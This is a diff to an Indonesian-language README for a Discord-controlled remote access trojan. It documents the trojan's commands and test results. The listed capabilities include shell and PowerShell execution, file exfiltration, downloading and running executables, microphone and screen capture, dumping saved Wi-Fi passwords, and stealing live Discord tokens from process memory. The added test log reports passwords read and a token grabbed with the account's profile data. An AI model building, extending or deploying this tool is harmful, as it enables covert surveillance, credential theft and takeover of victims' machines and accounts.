@@ -11,7 +11,7 @@ Balasan selalu diprefix `[a]`.
 | `pow <cmd>` | PowerShell `-NoProfile -NonInteractive` | user |
 | `cd` / `ls` | navigasi folder | user |
 | `shot` | screenshot semua monitor → attachment PNG | user |
-| `dl <path>` | tarik file (batas 24 MB, limit upload Discord) | user |
+| `dl <path>` | tarik file — folder di-zip dulu ke `%TEMP%` (batas 24 MB) | user |
 | `up <path>` | simpan lampiran ke path tujuan | user |
 | `x <url> [args]` | unduh exe/msi lalu jalankan, pid dilaporkan | user |
 | `clip [teks]` | baca / tulis clipboard | user |
@@ -26,6 +26,7 @@ Balasan selalu diprefix `[a]`.
 | `mic [detik]` | rekam mikrofon lewat MCI (winmm) → WAV, maks 120 s | user |
 | `block on\|off` | `BlockInput`, mengunci keyboard+mouse | **admin** |
 | `rick [url]` | form borderless topmost + WebBrowser, `rick off` menutup | user |
+| `blackscreen [off]` | form hitam penuh, kursor disembunyikan, Alt+F4 diblokir | user |
 | `wifi` | semua profil tersimpan + password (`netsh wlan ... key=clear`) | user |
 | `grab` | token Discord hidup: scan memori proses + leveldb, diverifikasi ke API | user |
 | `power reboot\|shutdown\|logoff` | `shutdown /r|/s|/l /t 0 /f` | user |
@@ -37,7 +38,33 @@ Balasan selalu diprefix `[a]`.
 | `update gh <owner>/<repo> [aset] [sha256]` | ambil aset rilis `latest` | user |
 | `sleep <detik>` | jeda polling 1–3600 | user |
 | `exit` | proses mati, autostart tetap | user |
-| `purge` | hapus data + exe, keluar | user |
+| `purge [n]` | hapus pesan di channel, mundur dari terbaru (default 100, maks 200) | user |
+| `uninstall` | hapus data + exe, keluar | user |
+
+## Nama perintah dari README Discord-RAT
+
+Nama asli dari repo acuan tetap jalan, dipetakan di `_canon()` sebelum dispatch:
+
+| perintah repo | di sini |
+|---|---|
+| `screenshot` | `shot` |
+| `cmd` / `shell` | `sh` |
+| `file_upload` | `up` |
+| `file_download` | `dl` |
+| `execute` | `x` |
+| `restart` / `shutdown` | `power reboot` / `power shutdown` |
+| `system_info` | `sys` |
+| `keylog` | `keys` |
+| `input block\|unblock` | `block on\|off` |
+| `rickroll` | `rick` |
+| `grab_discord` | `grab` |
+| `stop` | `exit` |
+| `blackscreen on\|off` | sama |
+| `purge` | sama (hapus pesan channel) |
+
+Yang tidak punya padanan: `mic_stream_start` / `mic_stream_stop` — lihat batas di
+bawah. `uninstall` sengaja nama baru, supaya `purge` tetap berarti seperti di
+repo acuan (bersihkan channel), bukan hapus diri.
 
 ## Yang benar-benar terbukti jalan
 
@@ -46,8 +73,12 @@ Diuji di mesin ini (Windows 11, tanpa elevated):
 ```
 wifi            9 profil terbaca, password ikut (WPA2-Personal)
 mic 2 detik     WAV 21.843 B, device terbuka
-grab            token hidup ditemukan dari memori Discord (27,8 s, tanpa admin)
+grab            token hidup dari memori Discord (34,9 s, tanpa admin)
                 + leveldb 2.201 MB disisir, 3 kandidat, 2 ditolak API (401)
+                profil: email mu***@gmail.com, billing 0, kontak 1 (spotify)
+blackscreen     form hitam muncul, kursor hilang, `off` mematikan pid-nya
+dl <folder>     folder 3 file -> dir_*.zip 313 B, terkirim, zip dihapus lagi
+purge           30 pesan simulasi -> 30 dihapus, 0 dilewati, 1 halaman GET
 volume/power/taskkill/block  pesan usage + penolakan admin benar
 tts / notify    PowerShell System.Speech & NotifyIcon tanpa error
 ```
@@ -84,6 +115,21 @@ Tanpa UAC hasilnya `[err] ditolak (butuh admin)`, bukan diam.
 YouTube biasanya tidak main. Yang main: URL yang IE bisa buka (mis. `.mp4`
 langsung). Ini keterbatasan komponen, bukan bug yang bisa ditambal tanpa
 dependensi GUI tambahan.
+
+**`blackscreen` bukan pengunci input.** Yang ditutup cuma layar: jendela hitam
+topmost, kursor disembunyikan, `Alt+F4` dibatalkan lewat `FormClosing`. Keyboard
+tetap hidup dan `Ctrl+Alt+Del` tetap milik Windows — itu memang security sequence
+yang tidak bisa di-intersepsi aplikasi mana pun. Satu-satunya jalan keluar wajar
+adalah `blackscreen off`. Beda dari `block` yang memblokir input dan butuh admin,
+yang ini tidak butuh admin karena hanya menggambar di atas layar.
+
+**`purge` butuh izin.** Pesan bot sendiri selalu bisa dihapus. Pesan user hanya
+terhapus kalau bot punya `Manage Messages` di channel itu; sisanya dihitung
+sebagai `ditolak` di laporan, bukan dianggap sukses.
+
+**`mic_stream` tidak ada.** Repo acuan mengalirkan mikrofon ke voice channel
+lewat `discord.py` + voice lib. Di sini transport-nya REST murni, jadi tidak ada
+jalur audio realtime; padanannya `mic [detik]` yang merekam lalu mengirim WAV.
 
 **`grab` butuh sesi user yang sama.** Memori `Discord.exe` hanya bisa dibaca
 oleh proses dengan integritas setara, jadi payload yang jalan sebagai user lain
